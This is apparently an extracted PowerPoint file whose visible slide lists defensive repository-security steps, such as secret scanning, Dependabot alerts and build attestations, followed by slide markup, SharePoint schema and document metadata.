              <a:t>Turn on secret scanning and push protection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enable Dependabot alerts and security updates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Add build provenance with artifact attestations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Agree oss-policy.json with Legal, then roll out</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Copy the workflows into a real project and iterate</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9521F-9DFA-CCDD-62D5-5716FB81DC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078449-3AC2-F95E-D9C6-1F82743AEFAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="282575"/>
            <a:ext cx="12192000" cy="317500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lst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a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="3200" dirty="0"/>
              <a:t>END</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2762786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Kyocera">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yocera_PPT_Template_KDC(MeiryoUI)4x3_201904.potx" id="{F7824327-EC3B-4A60-8311-B051A00F6AFE}" vid="{6D7B0D19-6042-4B58-9131-C9BAC69EA51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296099c-366c-42e5-ad7d-e6f4e7c5509d">
      <Terms xmlns="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    </lcf76f155ced4ddcb4097134ff3c332f>
    <TaxCatchAll xmlns="96fced89-2dba-4df6-b49a-30355bbfe48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B4B3B53C809E984D9893A65D7F513071" ma:contentTypeVersion="15" ma:contentTypeDescription="新しいドキュメントを作成します。" ma:contentTypeScope="" ma:versionID="20e7d137bd346128a9686e4a1c765efb">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="d296099c-366c-42e5-ad7d-e6f4e7c5509d" xmlns:ns3="96fced89-2dba-4df6-b49a-30355bbfe480" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="19633505b6b86e5d94ea775e766d7130" ns2:_="" ns3:_="">
    <xsd:import namespace="d296099c-366c-42e5-ad7d-e6f4e7c5509d"/>
    <xsd:import namespace="96fced89-2dba-4df6-b49a-30355bbfe4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96099c-366c-42e5-ad7d-e6f4e7c550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bdc7e581-dc3f-4937-89c0-8a736cf467b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6fced89-2dba-4df6-b49a-30355bbfe480" elementFormDefault="qualified">
    <xsd:import namespace="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <xsd:import namespace="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <xsd:element name="SharedWithUsers" ma:index="11"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共有相手の詳細情報" ma:internalName="SharedWithDetails" ma:readOnly="true">
      <xsd:simpleType>
        <xsd:restriction base="dms:Note">
          <xsd:maxLength value="255"/>
        </xsd:restriction>
      </xsd:simpleType>
    </xsd:element>
    <xsd:element name="TaxCatchAll" ma:index="17" nillable="true" ma:displayName="Taxonomy Catch All Column" ma:hidden="true" ma:list="{829c53cb-777f-4ecd-9f3c-46d6abafad1f}" ma:internalName="TaxCatchAll" ma:showField="CatchAllData" ma:web="96fced89-2dba-4df6-b49a-30355bbfe4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D3D008-3E51-4FD4-A566-4E24AFFD36AB}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps2.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{28E8814D-B370-44EF-8BA8-DEB5221437A1}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/dcmitype/"/>
    <ds:schemaRef ds:uri="a09aaaa2-c26f-494a-8b71-5441127fa977"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>
    <ds:schemaRef ds:uri="8f2f9b4d-1475-4024-b32b-c0bca1a49664"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="d296099c-366c-42e5-ad7d-e6f4e7c5509d"/>
    <ds:schemaRef ds:uri="96fced89-2dba-4df6-b49a-30355bbfe480"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{3FA1CF16-C3CD-4A4A-943C-AB929DDD62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96099c-366c-42e5-ad7d-e6f4e7c5509d"/>
    <ds:schemaRef ds:uri="96fced89-2dba-4df6-b49a-30355bbfe48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Kyocera_PPT_Template_KDC(MeiryoUI)4x3_201904</Template>
  <TotalTime>3168</TotalTime>
  <Words>6338</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>718</Paragraphs>
  <Slides>22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Meiryo UI</vt:lpstr>
      <vt:lpstr>游ゴシック</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Narrow</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Kyocera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Eguchi，Yuko(江口優子)</dc:creator>
  <cp:lastModifiedBy>Gabriel Jefferson Boltron</cp:lastModifiedBy>
  <cp:revision>181</cp:revision>
  <cp:lastPrinted>2026-01-07T00:51:13Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-04-25T02:35:23Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-23T03:18:00Z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0x010100B4B3B53C809E984D9893A65D7F513071</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="Order">
    <vt:lpwstr>9500.00000000000</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ies>
</file>